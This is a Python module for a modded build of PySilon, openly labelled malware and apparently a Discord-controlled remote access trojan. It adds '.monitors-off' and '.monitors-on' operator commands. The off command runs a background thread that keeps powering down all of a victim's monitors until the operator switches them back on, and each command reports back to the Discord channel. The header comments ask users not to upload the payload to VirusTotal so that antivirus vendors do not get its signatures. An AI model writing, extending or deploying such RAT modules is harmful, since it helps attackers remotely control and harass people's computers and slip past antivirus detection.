#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS
#PLEASE DO NOT ADD PAYLOAD ON VIRUSTOTAL ( it shares signatures with other av companies )


import monitorcontrol
import threading
# end of imports

# on message
elif message.content == '.monitors-off':
    if not turned_off:
        await message.delete()
        turned_off = True
        def monitor_off():
            while turned_off:
                for monitor in monitorcontrol.get_monitors():
                    with monitor:
                        monitor.set_power_mode(4)

        threading.Thread(target=monitor_off).start()

        embed = discord.Embed(title="🟢 Success",description=f'```Monitor tured off. Turn it bck on by using .monitors-on```', colour=discord.Colour.green())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        await message.channel.send(embed=embed)

    else:
        embed = discord.Embed(title="🔴 Hold on!",description=f'```Monitor alreay turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.red())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        await message.channel.send(embed=embed)

elif message.content == '.monitors-on':
    if turned_off:
        await message.delete()

        for monitor in monitorcontrol.get_monitors():
            with monitor:
                monitor.set_power_mode(1)

        embed = discord.Embed(title="🟢 Success",description=f'```Monitor has been urned on. Turn t off by using .monitors-off```', colour=discord.Colour.green())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        await message.channel.send(embed=embed)
        turned_off = False
    else: 
        embed = discord.Embed(title="🔴 Hold on!",description=f'```The moitor isnot turned off. Turn itoff by using .monitors-off```', colour=discord.Colour.red())
        embed.set_author(name="PIPI", icon_url="https://raw.githubusercontent.com/wiki/schroef/extra-image-list/images/extra-image-list.jpg")
        await message.channel.send(embed=embed)

#THIS WAS MADE BY @MASTERAUXB ON TWITTER PLEASE DO NOT DELETE 
#ORIGINAL AUTHOR : https://github.com/mategol/PySilon-malware
#MODDED AUTHOR : https://github.com/MaitreAuxb/
#I TOOK TIME TO CREATE THIS PROJECT PLEASE DO NO DELETE THIS
#PLEASE DO NOT ADD PAYLOAD ON VIRUSTOTAL ( it shares signatures with other av companies )
